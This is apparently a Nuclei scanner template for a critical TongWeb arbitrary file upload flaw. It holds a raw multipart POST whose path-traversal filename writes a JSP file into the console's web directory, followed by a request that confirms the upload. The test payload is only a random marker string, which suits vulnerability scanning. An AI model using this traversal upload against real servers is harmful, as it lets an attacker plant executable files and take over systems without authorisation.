id: tongweb-deploy-fileupload
info:
  name: 东方通 TongWeb upload 任意文件上传
  author: qwtd
  severity: critical
  reference:
    - https://github.com/search?q=%2Fheimdall%2Fdeploy%2Fupload%3Fmethod%3Dupload&type=code
  tags: Tongweb

http:
  - raw:
      - |
        POST /heimdall/deploy/upload?method=upload HTTP/1.1
        Host: 
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
        Connection: keep-alive
        Content-Length: 396
        Accept: */*
        Accept-Encoding: gzip, deflate, br
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs

        ------WebKitFormBoundary8UaANmWAgM4BqBSs
        Content-Disposition: form-data; name="file"; filename="../../applications/console/css/{{randstr_1}}.jsp"

        {{randstr_2}}
        ------WebKitFormBoundary8UaANmWAgM4BqBSs--            

      - |
        GET /console/css/{{randstr_1}}.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
        

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code_1==200 && status_code_2==200"
          - "contains(body_2, '{{randstr_2}}')"
        condition: and
